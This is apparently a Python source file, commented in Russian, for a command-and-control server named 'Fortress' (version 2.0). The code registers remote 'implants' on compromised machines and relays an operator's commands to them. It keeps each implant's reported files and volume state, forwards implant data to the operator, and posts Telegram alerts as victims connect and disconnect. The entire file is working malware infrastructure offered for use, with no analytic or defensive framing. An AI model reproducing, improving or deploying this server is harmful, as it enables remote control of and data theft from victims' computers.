#
# --- Файл: c2_server.py (Версия 2.0 - Модернизированный) ---
# Твой шаблон с двумя критическими исправлениями:
# 1. Добавлен Heartbeat для стабильного соединения на Render.
# 2. Добавлена "память" для правильной обработки get_details.
#
import asyncio
import json
import os
import threading
import urllib.parse
import urllib.request
from aiohttp import web
import settings

def send_telegram_message(message):
    """Асинхронно отправляет сообщение в Telegram в отдельном потоке."""
    def send():
        try:
            url = f"https://api.telegram.org/bot{settings.BOT_TOKEN}/sendMessage?chat_id={settings.CHAT_ID}&text={urllib.parse.quote_plus(message)}"
            urllib.request.urlopen(url, timeout=10)
        except Exception as e:
            print(f"[!] Ошибка отправки в Telegram: {e}")
    threading.Thread(target=send, daemon=True).start()

IMPLANTS, OPERATOR = {}, None

async def websocket_handler(request):
    global OPERATOR, IMPLANTS

    # --- МОДЕРНИЗАЦИЯ №1: СЕРДЕЧНЫЙ РИТМ ---
    ws = web.WebSocketResponse(heartbeat=25.0)
    await ws.prepare(request)

    client_type, client_id = None, None
    try:
        initial_msg = await ws.receive_json(timeout=15.0)
        client_type = initial_msg.get('type')

        if client_type == 'operator':
            OPERATOR = ws
            print("[+] Оператор подключился.")
            await broadcast_bot_list()
        elif client_type == 'implant':
            client_id = initial_msg.get('id')
            # --- МОДЕРНИЗАЦИЯ №2: ПАМЯТЬ ---
            IMPLANTS[client_id] = {
                "ws": ws,
                "initial_data": initial_msg # Сохраняем все начальные данные
            }
            print(f"[+] Новый имплант онлайн: {client_id}")
            send_telegram_message(f"✅ Имплант ОНЛАЙН: {client_id}")
            await broadcast_bot_list()
        else:
            await ws.close()
            return ws

        async for msg in ws:
            if msg.type == web.WSMsgType.TEXT:
                if msg.data == 'ping':
                    await ws.send_str('pong')
                    continue

                data = json.loads(msg.data)

                if client_type == 'operator':
                    target_id = data.get('target_id')
                    if data['type'] == 'command' and target_id in IMPLANTS:
                        await IMPLANTS[target_id]["ws"].send_json(data['payload'])
                    elif data['type'] == 'get_details' and target_id in IMPLANTS:
                        # Отдаем детали из "памяти"
                        initial_data = IMPLANTS[target_id].get("initial_data", {})
                        details = {
                            "files": initial_data.get("files"),
                            "volume_state": initial_data.get("volume_state") 
                        }
                        await OPERATOR.send_json({'type': 'bot_details', 'bot_id': target_id, 'data': details})

                elif client_type == 'implant':
                    # Просто пересылаем все обновления от импланта оператору
                    data['bot_id'] = client_id
                    if OPERATOR and not OPERATOR.closed:
                        await OPERATOR.send_json(data)

    except asyncio.TimeoutError:
        print("[!] Таймаут получения начального сообщения.")
    except Exception as e:
        print(f"[!] Ошибка в websocket_handler: {e}")
    finally:
        if client_type == 'implant' and client_id in IMPLANTS:
            del IMPLANTS[client_id]
            print(f"[-] Имплант отключился: {client_id}")
            send_telegram_message(f"❌ Имплант ОТКЛЮЧИЛСЯ: {client_id}")
            await broadcast_bot_list()
        elif client_type == 'operator':
            OPERATOR = None
            print("[-] Оператор отключился.")
    return ws

async def broadcast_bot_list():
    if OPERATOR and not OPERATOR.closed:
        bot_ids = list(IMPLANTS.keys())
        await OPERATOR.send_json({'type': 'bot_list', 'data': bot_ids})

async def http_handler(request):
    # Используем правильный путь к файлу
    return web.FileResponse(os.path.join(os.path.dirname(os.path.abspath(__file__)), 'index.html'))

async def main():
    app = web.Application()
    app.router.add_get('/', http_handler)
    app.router.add_get('/ws', websocket_handler)
    runner = web.AppRunner(app)
    await runner.setup()
    # Используем порт из переменных окружения для Render
    port = int(os.environ.get("PORT", 10000))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()
    print(f"====== C2 SERVER (V2.0 Модерн) ONLINE на порту {port} ======")
    send_telegram_message("🚀 Сервер запущен.")
    await asyncio.Event().wait()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\nСервер остановлен вручную.")
    finally:
        # Уведомление об остановке при ручном выключении
        send_telegram_message("🛑 Сервер 'Крепость' остановлен.")
